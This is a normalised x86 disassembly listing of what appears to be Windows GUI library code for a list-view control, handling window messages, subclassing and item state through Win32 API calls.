cmp [ ebx + 0x2ce ] 0x0
je r-xdata
or esi 0x100
cmp [ ebx + 0x2f4 ] 0x0
je r-xdata
or esi 0x10
test [ ebx + 0x2d1 ] 0x1
je r-xdata
or esi 0x2000
movzx eax [ r-xdata ]
and al [ ebx + 0x2d1 ]
movzx edx [ r-xdata ]
cmp dl al
je r-xdata
or esi 0x40
jmp r-xdata
test [ ebx + 0x2d1 ] 0x4
je r-xdata
or esi 0x80
test [ ebx + 0x2d1 ] 0x2
je r-xdata
or esi 0x800
mov eax ebx
call sub_496868
mov ebp eax
push esi
push 0x0
push 0x1036
push ebp
call SendMessageW
test edi edi
je r-xdata
or esi 0x1000
mov edx edi
mov eax ebx
call sub_4ac484
sub_4aa1c0
push ebx
push esi
push edi
push ecx
mov ebx eax
mov eax [ ebx + 0x28c ]
call sub_4a81b8
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebx + 0x2ac ]
call sub_4481b0
xor eax eax
mov [ ebx + 0x2ac ] eax
pop edx
pop edi
pop esi
pop ebx
retn
inc edi
xor esi esi
mov edx esi
mov eax [ ebx + 0x28c ]
call sub_4a81f0
movzx eax [ eax + 0x26 ]
push eax
mov edx esi
mov eax [ ebx + 0x28c ]
call sub_4a81f0
pop edx
call sub_4a7af8
mov edx esp
mov ecx 0x1
call sub_4274c8
mov edx esi
mov eax [ ebx + 0x28c ]
call sub_4a81f0
movzx edx [ esp ]
call sub_4a7af8
jmp r-xdata
mov eax [ ebx + 0x2ac ]
test eax eax
je r-xdata
inc esi
dec edi
jne r-xdata
sub_4aa24c
push ebx
push esi
push edi
push ecx
mov ebx eax
mov eax [ ebx + 0x2ac ]
test eax eax
jne r-xdata
push 0x0
push 0x0
call sub_4272f8
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov [ ebx + 0x2ac ] eax
jmp r-xdata
push 0x0
push 0x0
mov eax [ ebx + 0x2ac ]
call sub_427294
pop edx
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
mov eax [ ebx + 0x28c ]
call sub_4a81b8
mov esi eax
dec esi
test esi esi
jl r-xdata
mov edx edi
mov eax [ ebx + 0x28c ]
call sub_4a81f0
call sub_4a7aa4
mov [ esp ] al
mov edx esp
mov ecx 0x1
mov eax [ ebx + 0x2ac ]
call sub_427500
inc edi
dec esi
jne r-xdata
sub_4aa2d0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] dl
mov ebx eax
movzx eax [ ebx + 0x2cc ]
cmp al [ esp ]
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ esp ] 0x0
je r-xdata
movzx eax [ esp ]
mov [ ebx + 0x2cc ] al
mov eax ebx
call sub_4aa0b8
cmp [ ebx + 0x2cc ] 0x0
je r-xdata
xor edx edx
mov eax ebx
call sub_4ac484
mov eax [ ebx + 0x28c ]
call sub_4a81b8
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax ebx
call sub_4aa1c0
jmp r-xdata
inc edi
xor esi esi
mov eax ebx
call sub_496868
mov ebp eax
mov edx esi
mov eax [ ebx + 0x28c ]
call sub_4a81f0
call sub_4a801c
mov [ esp + 0x4 ] eax
push 0xf000
mov eax [ esp + 0x8 ]
push eax
push 0x102c
push ebp
call SendMessageW
shr eax 0xc
dec eax
mov ebp eax
mov edx esi
mov eax [ ebx + 0x28c ]
call sub_4a81f0
test ebp ebp
setne dl
mov [ eax + 0x26 ] dl
inc esi
dec edi
jne r-xdata
sub_4aa3b8
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
movzx eax [ esp ]
cmp al [ ebx + 0x2d1 ]
je r-xdata
pop edx
pop ebx
retn
movzx eax [ esp ]
mov [ ebx + 0x2d1 ] al
mov eax ebx
call sub_4aa0b8
sub_4aa3e0
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x2a4 ]
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x28c ]
call sub_4a82d8
mov [ esi + 0x2a4 ] bl
mov eax esi
call sub_492ec4
sub_4aa484
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jge r-xdata
mov edx esi
mov eax [ ebx + 0x28c ]
call sub_4a81f0
mov cl 0x1
mov edx 0x3
call sub_4a7d20
mov eax ebx
call sub_4ac538
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_4ac538
xor ecx ecx
mov edx 0x3
call sub_4a7d20
pop esi
pop ebx
retn
sub_4aa4f4
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_496868
mov esi eax
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x18 ]
call sub_46cf24
mov ebx eax
push ebx
push 0x0
push 0x1024
push esi
call SendMessageW
pop esi
pop ebx
retn
sub_4aa520
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_496868
mov esi eax
mov eax [ ebx + 0x6c ]
call sub_46cf24
mov edi eax
push edi
push 0x0
push 0x1026
push esi
call SendMessageW
mov eax ebx
call sub_496868
mov esi eax
mov eax [ ebx + 0x6c ]
call sub_46cf24
mov ebx eax
push ebx
push 0x0
push 0x1001
push esi
call SendMessageW
pop edi
pop esi
pop ebx
retn
sub_4aa56c
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x2c0 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x2c0 ] esi
mov eax ebx
call sub_496c14
test al al
je r-xdata
mov eax ebx
call sub_496868
push 0x0
push esi
push 0x102f
push eax
call SendMessageW
sub_4aa5a4
push ebx
mov ebx eax
mov eax ebx
call sub_495cb0
mov eax ebx
call sub_496c14
test al al
je r-xdata
pop ebx
retn
mov edx [ ebx + 0x6c ]
mov eax ebx
call sub_4aa520
sub_4aa5c8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x26c ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
call sub_495d94
pop esi
pop ebx
retn
mov eax ebx
call sub_492ec4
sub_4aa5ec
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4aa83f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx edi
mov eax ebx
call sub_494714
mov esi [ edi + 0x8 ]
mov eax ebx
call sub_4aa880
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4aa846
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
mov eax [ esi ]
cmp eax [ ebx + 0x2bc ]
jne r-xdata
mov eax [ esi + 0x8 ]
cmp eax 0xfffffecd
jg r-xdata
sub eax 0xfffffecf
je r-xdata
je r-xdata
mov eax [ edi + 0x8 ]
mov edi eax
mov edx [ edi + 0xc ]
mov eax ebx
call sub_4adae8
mov esi eax
mov eax ebx
call sub_496868
push 0x0
mov edx [ edi + 0xc ]
push edx
push 0x101d
push eax
call SendMessageW
mov edx eax
mov eax esi
call sub_4a71a8
xor ecx ecx
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0x138 ]
test al al
je r-xdata
sub eax 0x12c
je r-xdata
mov eax [ edi + 0x8 ]
mov edi [ eax + 0x14 ]
test [ edi ] 0x1
je r-xdata
sub eax 0xfffffeb9
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
jmp r-xdata
call GetMessagePos
mov esi eax
shr esi 0x10
call GetMessagePos
movzx eax ax
lea ecx [ ebp - 0xc ]
movzx edx si
call sub_432a5c
lea ecx [ ebp - 0x24 ]
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_48dac0
push [ ebp - 0x20 ]
push [ ebp - 0x24 ]
mov eax ebx
call sub_496868
push eax
call ChildWindowFromPoint
mov esi eax
test esi esi
je r-xdata
jmp r-xdata
mov edx [ eax + 0xc ]
mov eax ebx
call sub_4adae8
mov esi eax
mov eax [ esi + 0x18 ]
cmp eax [ edi + 0x4 ]
jl r-xdata
sub eax 0x2
je r-xdata
mov eax ebx
call sub_496868
cmp esi eax
je r-xdata
mov eax [ esi + 0x14 ]
test eax eax
jle r-xdata
mov [ edi + 0x4 ] eax
jmp r-xdata
sub eax 0xe
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx 0x50
call sub_449fd0
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov edx [ edi + 0x4 ]
mov eax esi
call sub_4a71a8
jmp r-xdata
cmp eax [ edi + 0x4 ]
jg r-xdata
mov [ ebx + 0x2f5 ] 0x1
jmp r-xdata
jmp r-xdata
mov edi eax
test edi edi
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov [ edi + 0x4 ] eax
push edi
mov eax [ ebp - 0x4 ]
call sub_449db8
push eax
push esi
call GetClassNameW
mov edx eax
lea eax [ ebp - 0x4 ]
call sub_449fd0
mov eax [ ebp - 0x4 ]
mov edx r-xdata
call j_sub_44a294
jne r-xdata
sub edi 0x4
mov edi [ edi ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
lea ecx [ ebp - 0x24 ]
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_48dac0
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
push 0x0
mov eax ebx
call sub_496868
push eax
call GetScrollPos
add [ ebp - 0x1c ] eax
lea eax [ ebp - 0x1c ]
push eax
mov ecx 0x1
mov edx 0x1206
mov eax esi
call sub_41f0dc
test eax eax
jl r-xdata
mov edx [ ebp - 0x10 ]
mov eax ebx
call sub_4adae8
mov edx eax
lea ecx [ ebp - 0x1c ]
mov eax ebx
mov si 0xffac
call sub_4483f8
sub_4aa88c
push ebx
mov ebx eax
mov eax ebx
call sub_495cd8
mov eax ebx
call sub_496c14
test al al
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x64 ]
mov edx [ eax + 0x18 ]
mov eax ebx
call sub_4aa4f4
mov eax ebx
call sub_4aa880
test al al
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebx + 0x2bc ]
push eax
call InvalidateRect
sub_4aa8f4
push ebx
push esi
mov esi edx
mov ebx [ eax + 0x294 ]
movzx edx [ esi + 0x8 ]
mov eax ebx
call sub_4a90ac
movzx edx [ esi + 0x9 ]
mov eax ebx
call sub_4a90c0
movzx edx [ esi + 0xa ]
mov eax ebx
call sub_4a90d4
pop esi
pop ebx
retn
sub_4aa924
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x26d ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x26d ] dl
mov eax ebx
call sub_496c14
test al al
je r-xdata
push 0xfffffff0
mov eax ebx
call sub_496868
push eax
call GetWindowLongW
mov esi eax
and esi 0xfffffffc
movzx eax [ ebx + 0x26d ]
or esi [ eax * 4 + rw-data ]
push esi
push 0xfffffff0
mov eax ebx
call sub_496868
push eax
call SetWindowLongW
mov eax ebx
call sub_4ac874
movzx eax [ ebx + 0x26d ]
sub al 0x2
jae r-xdata
mov eax ebx
call sub_492ec4
mov eax [ ebx + 0x294 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov dl 0x1
mov eax ebx
call sub_4ac84c
mov dl 0x3
mov eax ebx
call sub_4ac84c
jmp r-xdata
sub_4aa9b0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
call sub_495910
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x2bc ] 0x0
jne r-xdata
mov edi [ esi + 0x8 ]
mov [ ebx + 0x2bc ] edi
push 0xfffffffc
push edi
call GetWindowLongW
mov [ ebx + 0x2b4 ] eax
mov eax [ ebx + 0x3ec ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x2bc ]
push eax
call SetWindowLongW
sub_4aaa00
push ebx
push esi
mov ebx eax
or esi 0xffffffff
mov eax ebx
call sub_4ac538
test eax eax
je r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax ebx
call sub_4ac538
call sub_4a801c
mov esi eax
sub_4aaa28
push ebx
cmp [ eax + 0x36a ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x36c ]
call [ ebx + 0x368 ]
mov al 0x1
pop ebx
retn
sub_4aaa50
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] 0xffffffff
cmp [ eax + 0x372 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ebp
retn 0x14
push ecx
mov ecx [ ebp + 0x18 ]
push ecx
mov ecx [ ebp + 0x14 ]
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
movzx ecx [ ebp + 0xc ]
push ecx
movzx ecx [ ebp + 0x8 ]
push ecx
lea ecx [ ebp - 0x4 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x374 ]
call [ ebx + 0x370 ]
sub_4aaa9c
push ebx
cmp [ eax + 0x37a ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x37c ]
call [ ebx + 0x378 ]
mov al 0x1
pop ebx
retn
sub_4aaac4
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x382 ] 0x0
je r-xdata
xor eax eax
push ecx
movzx ecx [ ebp + 0xc ]
push ecx
movzx ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x384 ]
call [ ebx + 0x380 ]
mov al 0x1
jmp r-xdata
pop ebx
pop ebp
retn 0x8
sub_4aaafc
push ebx
push ecx
mov ebx eax
mov eax [ r-xdata ]
mov [ esp ] eax
cmp [ ebx + 0x3da ] 0x0
je r-xdata
mov ecx [ ebx + 0x28c ]
mov dl 0x1
mov eax [ esp ]
call [ eax + 0xc ]
pop edx
pop ebx
retn
mov ecx esp
mov edx ebx
mov eax [ ebx + 0x3dc ]
call [ ebx + 0x3d8 ]
sub_4aab44
push ebx
push esi
mov esi eax
movzx ebx [ r-xdata ]
test esi 0x1
je r-xdata
test esi 0x2
je r-xdata
or bl 0x1
test esi 0x4
je r-xdata
or bl 0x2
test esi 0x8
je r-xdata
or bl 0x4
test esi 0x10
je r-xdata
or bl 0x8
mov eax ebx
pop esi
pop ebx
retn
or bl 0x10
sub_4aab90
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
lea edi [ ebp - 0x3c ]
mov ecx 0xd
[ edi ] [ esi ]
mov esi eax
xor eax eax
push ebp
push sub_4aacb4
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x3c ]
test bl 0x4
je r-xdata
cmp [ esi + 0x2a4 ] 0x0
je r-xdata
mov ebx [ ebp - 0x1c ]
jmp r-xdata
mov edx [ ebp - 0x38 ]
mov eax [ esi + 0x28c ]
call sub_4a81f0
mov ebx eax
cmp [ ebp - 0x38 ] 0x0
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4aacbb
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
xor ebx ebx
jmp r-xdata
mov ebx [ esi + 0x2ec ]
jmp r-xdata
mov eax ebx
call sub_4aab44
mov [ ebp - 0x5 ] al
mov eax [ esi + 0x2ec ]
mov edx [ ebp - 0x38 ]
mov [ eax + 0x14 ] edx
mov edx [ ebp - 0x1c ]
mov [ eax + 0x28 ] edx
mov eax [ eax + 0x8 ]
mov edx [ eax ]
call [ edx + 0x44 ]
test [ ebp - 0x5 ] 0x1
je r-xdata
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_449d80
cmp [ ebp - 0x28 ] 0x0
je r-xdata
test [ ebp - 0x5 ] 0x10
je r-xdata
mov eax [ esi + 0x2ec ]
mov edx [ ebp - 0x20 ]
mov [ eax + 0xc ] edx
lea edx [ ebp - 0x4 ]
mov eax [ ebp - 0x28 ]
call sub_4363d8
jmp r-xdata
movzx ecx [ ebp - 0x5 ]
mov edx [ esi + 0x2ec ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x128 ]
mov ebx [ esi + 0x2ec ]
jmp r-xdata
mov eax [ esi + 0x2ec ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x10 ] edx
mov eax [ esi + 0x2ec ]
add eax 0x20
mov edx [ ebp - 0x4 ]
call sub_449d2c
test [ ebp - 0x5 ] 0x2
je r-xdata
sub_4aacdc
test al 0x1
je r-xdata
test al 0x8
je r-xdata
xor eax eax
retn
test al 0x2
je r-xdata
mov al 0x1
jmp r-xdata
test al 0x40
je r-xdata
mov al 0x2
jmp r-xdata
retn
xor eax eax
mov al 0x3
jmp r-xdata
sub_4aad00
push ebx
push esi
mov esi eax
movzx ebx [ r-xdata ]
test esi 0x20
je r-xdata
test esi 0x4
je r-xdata
or bl 0x20
test esi 0x8
je r-xdata
or bl 0x2
test esi 0x1
je r-xdata
or bl 0x4
test esi 0x2
je r-xdata
or bl 0x8
mov eax ebx
pop esi
pop ebx
retn
or bl 0x10
sub_4aad49
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xffffff28
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xd0 ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4abbe8
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebp - 0xc ]
mov esi [ esi + 0x8 ]
mov eax [ esi + 0x8 ]
cmp eax 0xffffff93
jg r-xdata
cmp eax 0xffffff9a
jg r-xdata
je r-xdata
cmp eax 0xfffffff4
jg r-xdata
je r-xdata
mov eax [ ebp - 0xc ]
mov eax [ esi + 0xc ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0x2c4 ] eax
jmp r-xdata
cmp eax 0xffffff51
jg r-xdata
sub eax 0xfffffffb
je r-xdata
je r-xdata
mov eax [ ebp - 0xc ]
mov edx [ esi + 0xc ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x28c ]
call sub_4a81f0
mov edx eax
mov eax [ ebp - 0x8 ]
mov si 0xffa9
call sub_4483f8
jmp r-xdata
add eax 0x6c
cmp eax 0x5
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4abbef
lea eax [ ebp - 0xd0 ]
call j_sub_449348
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
cmp eax 0xffffff6a
jg r-xdata
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0x291 ] 0x1
sub eax 0x3
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x268 ]
test eax eax
je r-xdata
sub eax 0xffffff9b
je r-xdata
jmp [ eax * 4 + jump_table_4aae37 ]
sub eax 0xffffff8d
je r-xdata
je r-xdata
mov eax [ ebp - 0xc ]
lea edx [ esi + 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4aab90
mov edi eax
mov edx edi
mov eax [ ebp - 0x8 ]
mov si 0xffaf
call sub_4483f8
test al al
jne r-xdata
cmp eax 0xffffff4d
jg r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0x290 ] 0x1
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0xc ]
mov [ ebp - 0x24 ] esi
xor edx edx
push ebp
push sub_4ab6af
push [ fs : edx ]
mov [ fs : edx ] esp
call sub_46e3b0
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax + 0xc ] edx
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0xc ]
test eax 0x10000
jne r-xdata
mov eax [ ebp - 0xc ]
mov ebx esi
mov edx [ ebx + 0xc ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x28c ]
call sub_4a81f0
mov edi eax
mov ecx [ ebx + 0x1c ]
mov edx edi
mov eax [ ebp - 0x8 ]
mov si 0xffae
call sub_4483f8
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x3ca ] 0x0
je r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0xc ]
mov edx [ esi + 0x28 ]
mov eax [ ebp - 0x8 ]
mov si 0xffab
call sub_4483f8
mov eax [ ebp - 0xc ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x28c ]
call sub_4a81b8
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ ebp - 0xc ]
cmp [ esi + 0x20 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov edx [ esi + 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_4adae8
mov edx eax
mov eax [ ebp - 0x8 ]
mov si 0xffad
call sub_4483f8
jmp r-xdata
mov eax [ ebp - 0xc ]
mov eax [ esi + 0x14 ]
call sub_4aad00
push eax
mov eax [ esi + 0x18 ]
call sub_4aad00
push eax
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0xc ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x134 ]
jmp r-xdata
sub eax 0x2
je r-xdata
mov eax [ ebp - 0xc ]
mov ebx esi
lea edx [ ebx + 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4aab90
mov edi eax
lea eax [ ebx + 0xc ]
mov ebx eax
test [ ebx ] 0x1
je r-xdata
add eax 0x9e
sub eax 0x2
jb r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
mov [ eax + 0xc ] 0x1
sub eax 0xffffff4f
je r-xdata
je r-xdata
mov esi [ ebp - 0xc ]
mov esi [ esi + 0x8 ]
test eax 0x20000
setne [ ebp - 0x1a ]
cmp [ ebp - 0x1a ] 0x0
je r-xdata
lea edx [ ebp - 0x3c ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0xc ]
dec eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
cmp [ ebx + 0x1c ] 0x8
jne r-xdata
mov eax [ ebp - 0xc ]
mov ebx esi
mov edx [ ebx + 0xc ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x28c ]
call sub_4a81f0
mov edx eax
mov ecx [ ebx + 0x1c ]
mov eax [ ebp - 0x8 ]
mov si 0xffb0
call sub_4483f8
test al al
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0xc ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x28c ]
mov edx ebx
call sub_4a81f0
mov edx eax
mov eax [ ebp - 0x8 ]
mov si 0xffab
call sub_4483f8
dec ebx
cmp ebx 0xffffffff
jne r-xdata
cmp [ esi + 0x10 ] 0xffffffff
je r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0xc ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x130 ]
jmp r-xdata
jmp r-xdata
test [ ebx ] 0x2
je r-xdata
mov esi [ ebx + 0x8 ]
test esi esi
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x3ba ] 0x0
je r-xdata
sub eax 0x4
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_496868
mov ebx eax
push 0x0
push 0x0
push 0x1018
push ebx
call SendMessageW
mov edx [ ebp - 0x8 ]
mov ebx eax
mov [ edx + 0x2b8 ] ebx
push 0xfffffffc
push ebx
call GetWindowLongW
mov edx [ ebp - 0x8 ]
mov [ edx + 0x2b0 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x3e8 ]
push eax
push 0xfffffffc
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2b8 ]
push eax
call SetWindowLongW
jmp r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0xc ]
mov ebx esi
mov eax [ ebx + 0x10 ]
call sub_4aacdc
mov [ ebp - 0xe ] al
xor esi esi
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_449d80
lea ecx [ ebp - 0x18 ]
xor edx edx
xor eax eax
call sub_432a5c
mov [ ebp - 0x19 ] 0x4
movzx eax [ ebp - 0xe ]
sub al 0x1
jb r-xdata
sub eax 0xfffffeb8
je r-xdata
mov edi [ esi + 0x38 ]
lea eax [ ebp - 0x70 ]
xor ecx ecx
mov edx 0x34
call sub_447ae4
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x24 ]
mov [ ebp - 0x6c ] eax
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0xc ]
mov edx eax
and edx 0x10001
cmp edx 0x10001
jne r-xdata
cmp [ esi + 0x38 ] 0x0
jne r-xdata
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x138 ]
test al al
je r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x3d2 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
test [ ebx + 0x18 ] 0x2
je r-xdata
mov eax [ ebp - 0xc ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
lea edx [ esi + 0xc ]
mov eax [ ebp - 0x8 ]
mov si 0xffaa
call sub_4483f8
jmp r-xdata
test [ ebx ] 0x10
je r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x2c ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp esi eax
jg r-xdata
mov ecx [ ebx + 0x18 ]
dec ecx
mov edx [ edi + 0x20 ]
mov eax [ ebx + 0x14 ]
call sub_4361d0
jmp r-xdata
lea edx [ ebp - 0xd8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_49bdf8
lea edx [ ebp - 0xd8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_483708
jmp r-xdata
jmp r-xdata
jmp r-xdata
mov esi [ ebx + 0x18 ]
jmp r-xdata
sub al 0x2
jb r-xdata
mov eax [ ebp - 0xc ]
mov ebx esi
mov esi [ ebx + 0x14 ]
test [ esi ] 0x1
je r-xdata
sub eax 0x14
je r-xdata
mov edx eax
and edx 0x10002
cmp edx 0x10002
jne r-xdata
xor eax eax
push ebp
push sub_4ab407
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x24 ]
mov edx [ eax + 0x10 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x268 ]
call sub_46e950
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x64 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x268 ]
call sub_46e7e4
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x1b8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x268 ]
call sub_46e800
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x268 ]
mov eax [ eax + 0xc ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0xc ] edx
mov [ eax + 0x8 ] sub_4ad2dc
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x268 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0xc ] edx
mov [ eax + 0x8 ] sub_4ad2dc
mov eax [ ebp - 0x8 ]
mov [ eax + 0x2ea ] 0x0
cmp [ ebp - 0x1a ] 0x0
je r-xdata
call sub_448d2c
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x138 ]
test al al
jne r-xdata
xor eax eax
push ebp
push sub_4ab011
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x24 ]
mov edx [ eax + 0x10 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x268 ]
call sub_46e950
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x64 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x268 ]
call sub_46e7e4
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x1b8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x268 ]
call sub_46e800
lea edx [ ebp - 0x3c ]
xor ecx ecx
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x114 ]
mov [ ebp - 0xd ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x268 ]
xor edx edx
call sub_46e950
retn
mov cl 0x1
xor edx edx
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x138 ]
test al al
je r-xdata
dec eax
je r-xdata
cmp [ ebx + 0x1c ] 0x8
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x68 ] 0x0
je r-xdata
test [ ebx + 0x18 ] 0x2
jne r-xdata
test [ ebx + 0x14 ] 0x2
jne r-xdata
mov eax [ edi + 0x10 ]
mov [ ebx + 0x24 ] eax
jmp r-xdata
mov eax [ ebx + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov edx edi
mov eax [ ebp - 0x8 ]
call sub_4ac680
mov eax [ edi + 0xc ]
mov [ ebx + 0x1c ] eax
mov eax [ ebp - 0x8 ]
